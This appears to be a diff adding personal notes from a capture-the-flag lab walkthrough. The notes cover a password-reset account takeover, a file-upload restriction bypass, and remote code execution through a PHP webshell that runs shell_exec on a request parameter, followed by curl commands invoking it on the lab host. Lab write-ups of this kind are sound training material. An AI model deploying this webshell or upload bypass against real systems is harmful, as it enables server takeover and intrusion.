@@ -51,18 +51,43 @@
 
 
 # Weak Password Reset
+  what we know:  <ins>the administrator's email address: s.mitchell@recruitx.thm </ins>
+    
+  Let's take over her account!
 
+  1) Navigate to the reset.php?
+  2) Enter testuser@fake.thm and submit the form.
+  3) get the token. usually sent to the email, not on the screen directly.
+  4) use the token as password and login with the administrator's email address.
 
+# Admin Panel Access
 
+accept attribute restricts the file type.
 
+  - Use echo on linux terminal to make any file (txt or phtml)
+  - Must select All files when uploading.
 
+# Remote Code Execution
 
-
-
-
-
-
-
+  Webshell: a small script that accepts commands through HTTP parameters and executes them on the server.
+  
+1) Create and save  shell.phtml:
+   '''
+       <?php
+    if(isset($_GET['cmd'])) {
+        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+    }
+    ?>
+   '''
+3) Verify the code execution by running a simple commnand:
+   '''
+   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=whoami"
+   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=id"
+   '''
+5) Gather more information about the system:
+   '''
+   curl "http://10.67.155.72/uploads/documents/shell.phtml?cmd=hostname"
+   '''
 
 
 
